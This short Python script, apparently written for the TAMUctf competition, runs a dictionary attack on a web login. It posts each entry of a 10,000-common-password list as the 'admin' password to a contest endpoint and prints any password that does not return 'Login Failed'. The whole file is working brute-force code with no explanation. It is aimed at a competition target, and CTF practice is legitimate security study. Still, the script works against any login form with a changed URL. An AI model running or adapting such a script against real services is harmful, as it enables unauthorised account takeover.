#!/usr/bin/env python3

import requests
import json

with open('10k-most-common.txt') as file:
   dictionary = file.readlines()
dictionary = [word.strip() for word in dictionary]
count = 0
for thing in dictionary:
   payload = {"username": "admin", "password": thing}
   JSONpayload = json.dumps(payload)
   r = requests.post("http://web4.tamuctf.com/login", data=JSONpayload)

   if "Login Failed" not in r.text:
       print(thing)
   elif(count % 100 == 0):
       print("Attempt " + str(count) + " failed!")
   count = count + 1
   #print(JSONpayload)
   #print(r.text)

